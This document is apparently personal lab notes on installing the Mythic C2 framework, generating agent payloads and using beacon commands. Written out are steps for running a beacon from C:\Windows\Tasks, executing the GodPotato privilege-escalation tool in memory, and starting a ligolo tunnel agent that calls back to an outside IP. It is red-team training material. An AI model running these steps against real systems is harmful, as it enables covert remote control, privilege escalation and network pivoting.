
Mythic is a C2 server, used to deploy and control agents often used for AV evasion or persistence. 

## Installing Mythic

```bash
# Install docker
sudo apt update -y
sudo apt install docker -y
sudo apt install docker.io -y
sudo apt install docker-compose -y

# Git clone
git clone https://github.com/its-a-feature/Mythic
cd Mythic

# We need to make the binary, from the makefile in the Mythic directory.
sudo make
```

Now we can run Mythic for the first time
```bash
# Run Mythic for the first time
sudo -E ./mythic-cli start

# The config file is stored here if we want to modify it
vi Mythic/.env

# We need to install agents
# We'll start with Poseidon, used for Mac and Linux
sudo ./mythic-cli install github https://github.com/MythicAgents/Poseidon

# Install Apollo for use on Windows
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo

# We'll also need to install the http profile.
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```
The 'installed services' tab is important, we can see what all is installed.
![[Pasted image 20250526215523.png]]
## Web Interface
This is where can manage a lot of things. It's accessed at
`https://127.0.0.1:7443` by default
We'll find our admin credentials in the .env file
```bash
cat Mythic/.env | grep -i 'user'
cat Mythic/.env | grep -i 'password'

# If we wanted to, we could modify these, then restart Mythic
sudo ./mythic-cli restart
```

We can click 'Create Your First Payload'
![[Pasted image 20250526215029.png]]
We can leave most of this stuff unchanged, except maybe statically compile the payload.
Additionally, changing the callback details is necessary

![[Pasted image 20250526215701.png]]
We should be able to use our IP here, and port 80 is the default port. Even though we're not using HTTP/S, the traffic itself will be encrypted.
![[Pasted image 20250526215905.png]]
We can see our page on the 'payloads' page
![[Pasted image 20250526220223.png]]

We can just download and execute it. My first ever C2 beacon callback.
![[Pasted image 20250526224612.png]]


## Windows Beacon
Run it in a good directory (C:\Windows\Tasks), (C:\Users\Public). 

```powershell
Start-Process beacon.exe
```



# Useful Beacon Commands
## Register Assembly
We can put dotnet binaries into the agent. This is an opsec effective way of executing binares

N
```
register_assembly GodPotato-NET4.exe
execute_assembly -Assembly GodPotato-NET4.exe -Arguments "-cmd 'c:\users\public\taskmanager.exe'"
```

## Download/Upload
Self explanatory

## Shell
Runs cmd from the context of cmd. A command might look like
```
shell 'C:\Windows\tasks\windows-ligolo-agent.exe -connect 10.10.16.157:443 -ignore-cert'
```
## References
https://redsiege.com/blog/2023/06/introduction-to-mythic-c2/

